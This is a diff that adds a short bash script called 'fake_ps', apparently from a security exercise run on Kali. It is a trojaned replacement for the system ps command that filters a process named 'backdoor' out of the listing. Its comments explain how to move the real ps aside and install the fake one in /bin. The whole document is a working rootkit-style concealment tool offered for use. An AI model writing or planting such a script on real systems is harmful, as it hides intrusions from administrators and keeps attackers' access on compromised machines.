@@ -1,0 +1,16 @@
+#!/bin/bash
+
+# instructions:
+# place fake_ps in /bin directory
+# place original actual ps in some folder, like /bin/orig or something (make sure to update the call to ps in this script to reflect the new directory it is in)
+# rename fake_ps to ps
+
+
+# Note: would change /bin/orig/ps to wherever we store the original ps
+# hide the backdoor process 
+# also hide grep too since normal ps wouldn't show grep, but this fake_ps does
+/bin/orig/ps $@ | grep -v "backdoor" | grep -v "grep"
+
+# Note, need to run: 
+# chmod 755 fake_ps
+# sed -i -e 's/\r$//' fake_ps (only in kali machine?)
